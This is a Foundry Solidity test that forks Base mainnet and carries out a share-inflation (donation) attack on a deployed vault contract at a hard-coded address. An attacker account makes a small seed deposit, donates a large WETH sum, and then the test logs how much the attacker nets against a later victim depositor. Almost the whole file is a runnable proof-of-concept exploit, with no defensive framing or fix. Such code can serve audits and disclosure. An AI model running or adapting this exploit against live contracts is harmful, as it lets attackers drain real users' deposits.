// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "../src/Interfaces.sol";

contract SweepTest is Test {
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant V1 = 0x2AeCe2BE0651baE5e2EF49426060B814E245829c;

    address attacker = address(0xA11CE);
    address victim   = address(0xB0B);

    function setUp() public {
        string memory rpc = vm.envOr("BASE_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = "https://mainnet.base.org";
        vm.createSelectFork(rpc);
    }

    function _run(address v, uint256 seed, uint256 donation, uint256 vdep) internal {
        emit log_named_string("### combo", "v");
        emit log_named_uint("donation", donation);
        deal(WETH, attacker, 5000 ether);
        deal(WETH, victim, 5000 ether);
        vm.startPrank(attacker);
        IERC20(WETH).approve(v, type(uint256).max);
        uint256 ashares = IDexFiVault(v).deposit(seed, attacker, 0);
        IERC20(WETH).transfer(v, donation);
        vm.stopPrank();
        vm.startPrank(victim);
        IERC20(WETH).approve(v, type(uint256).max);
        uint256 vshares = IDexFiVault(v).deposit(vdep, victim, 0);
        vm.stopPrank();
        emit log_named_uint("attacker seed shares", ashares);
        emit log_named_uint("victim shares", vshares);

        uint256 aBefore = IERC20(WETH).balanceOf(attacker);
        uint256 abal = IDexFiVault(v).balanceOf(attacker);
        vm.prank(attacker);
        uint256 aOut = IDexFiVault(v).withdraw(abal, attacker, 0);
        emit log_named_int("attacker NET", int256(IERC20(WETH).balanceOf(attacker)) - int256(aBefore) - int256(donation));

        uint256 vBefore = IERC20(WETH).balanceOf(victim);
        uint256 vbal = IDexFiVault(v).balanceOf(victim);
        vm.prank(victim);
        uint256 vOut = IDexFiVault(v).withdraw(vbal, victim, 0);
        emit log_named_int("victim NET", int256(IERC20(WETH).balanceOf(victim)) - int256(vBefore) - int256(vdep));
        emit log_named_uint("attacker out", aOut);
        emit log_named_uint("victim out", vOut);
    }

    function test_sweep_V1_2() public { _run(V1, 0.01 ether, 2 ether, 1 ether); }
    function test_sweep_V1_20() public { _run(V1, 0.01 ether, 20 ether, 1 ether); }
}
